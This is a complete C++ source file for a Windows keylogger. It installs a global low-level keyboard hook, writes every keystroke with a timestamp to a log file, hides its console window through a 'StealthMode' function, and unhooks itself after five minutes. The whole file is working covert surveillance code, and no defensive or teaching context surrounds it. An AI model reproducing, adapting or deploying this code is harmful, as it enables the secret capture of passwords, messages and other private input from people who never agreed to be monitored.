#include <cstring>
#include <Windows.h>
#include <ctime>
#include <thread>
#include <fstream>
#include <iomanip>

char c; // char to examine in the msg
SYSTEMTIME st; // keep track of time
time_t start, end; // times to track the end of the hook
std::ofstream log_file; // save to log file the msgs

DWORD WINAPI TimeCheckThread(HHOOK kbd) {
    end = time(nullptr);
    // here you change the 5 to the minute counter you want
    while (end - start < (60 * 5)) { // while minutes didn't pass, don't close : 60 * t = t minutes
        end = time(nullptr);
    }
    log_file.close(); // close the log file
    UnhookWindowsHookEx(kbd); // unhook
    LPCWSTR end_msg = L"Log file saved successfully."; // The message to display
    LPCWSTR title_mg = L"End of act"; // The title of the message box
    MessageBoxW(nullptr, end_msg, title_mg, MB_OK);
    exit(0); // exit the program
}

LRESULT CALLBACK KBDHook(int nCode, WPARAM wParam, LPARAM lParam) {
    auto* s = (KBDLLHOOKSTRUCT*) lParam;
    if (wParam == WM_KEYDOWN) { // if a key is pressed, check whatever is the key code
        switch (s->vkCode) {
            case VK_BACK:
                log_file << "\n**BACKSPACE**";
                break;
            case VK_TAB:
                log_file << "\n**TAB**";
                break;
            case VK_CLEAR:
                log_file << "\n**CLEAR**";
                break;
            case VK_RETURN:
                log_file << "\n**ENTER**";
                break;
            case VK_SHIFT:
                log_file << "\n**SHIFT**";
                break;
            case VK_CONTROL:
                log_file << "\n**CONTROL**";
                break;
            case VK_MENU:
                log_file << "\n**ALT**";
                break;
            case VK_PAUSE:
                log_file << "\n**PAUSE**";
                break;
            case VK_CAPITAL:
                log_file << "\n**CAPS LOCK**";
                break;
            case VK_ESCAPE:
                log_file << "\n**ESCAPE**";
                break;
            case VK_SPACE:
                log_file << "\n**SPACE BAR**";
                break;
            case VK_PRIOR:
                log_file << "\n**PAGE UP**";
                break;
            case VK_NEXT:
                log_file << "\n**PAGE DOWN**";
                break;
            case VK_END:
                log_file << "\n**END KEY**";
                break;
            case VK_HOME:
                log_file << "\n**HOME KEY**";
                break;
            case VK_LEFT:
                log_file << "\n**LEFT ARROW**";
                break;
            case VK_RIGHT:
                log_file << "\n**RIGHT ARROW**";
                break;
            case VK_UP:
                log_file << "\n**UP ARROW**";
                break;
            case VK_DOWN:
                log_file << "\n**DOWN ARROW**";
                break;
            case VK_SELECT:
                log_file << "\n**SELECT KEY**";
                break;
            case VK_PRINT:
                log_file << "\n**PRINT KEY**";
                break;
            case VK_EXECUTE:
                log_file << "\n**EXECUTE KEY**";
                break;
            case VK_SNAPSHOT:
                log_file << "\n**PRINT SCREEN KEY**";
                break;
            case VK_INSERT:
                log_file << "\n**INSERT KEY**";
                break;
            case VK_DELETE:
                log_file << "\n**DELETE KEY**";
                break;
            case VK_LCONTROL:
                log_file << "\n**LEFT CTRL**";
                break;
            case VK_RCONTROL:
                log_file << "\n**RIGHT CTRL**";
                break;
            case VK_LSHIFT:
                log_file << "\n**LEFT SHIFT**";
                break;
            case VK_RSHIFT:
                log_file << "\n**RIGHT SHIFT**";
                break;
            case VK_LMENU:
                log_file << "\n**LEFT ALT**";
                break;
            case VK_RMENU:
                log_file << "\n**RIGHT ALT**";
                break;
            default:
                c = MapVirtualKey(s->vkCode, 2);
                log_file << "\n" << c;
                break;
        }
        GetLocalTime(&st); // get cuurent time
        log_file << " " << std::setfill('0') << std::setw(2) << st.wHour << ":"; // Formatting hours with leading zero
        log_file << std::setfill('0') << std::setw(2) << st.wMinute << ":"; // Formatting minutes with leading zero
        log_file << std::setfill('0') << std::setw(2) << st.wSecond; // Formatting seconds with leading zero
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam); // next hook msg
}

void StealthMode() { // function to hide window and run in the background
    AllocConsole();
    HWND stealth = FindWindowA("ConsoleWindowClass", nullptr);
    ShowWindow(stealth, 0);
}

int main() {

    StealthMode(); // hide the hook

    HHOOK kbd = SetWindowsHookEx(13, &KBDHook, nullptr, 0); // hook it
    MSG message;
    log_file.open(R"(your-path-goes-here)", std::ofstream::out); // open the log file
    if (!log_file.is_open()) { // if failed to open log file
        LPCWSTR failure_msg = L"Failed to open log file"; // The message to display
        LPCWSTR title_mg = L"Error"; // The title of the message box
        MessageBoxW(nullptr, failure_msg, title_mg, MB_OK | MB_ICONEXCLAMATION);
        return 0;
    }

    if (kbd == nullptr) { // if failed to hook
        log_file << "Hook failed. ";
        log_file.close();
        return 0;
    }
    else {
        start = time(nullptr);
        DWORD time_thread_id;
        // thread to track the time of the hook
        [[maybe_unused]] HANDLE time_handle = CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(TimeCheckThread), kbd, 0, &time_thread_id);
        while (GetMessageW(&message, nullptr, 0, 0)) // check every msg in the msg queue
        {
            TranslateMessage(&message);
            DispatchMessage(&message);
        }
    }

    return 0;
}
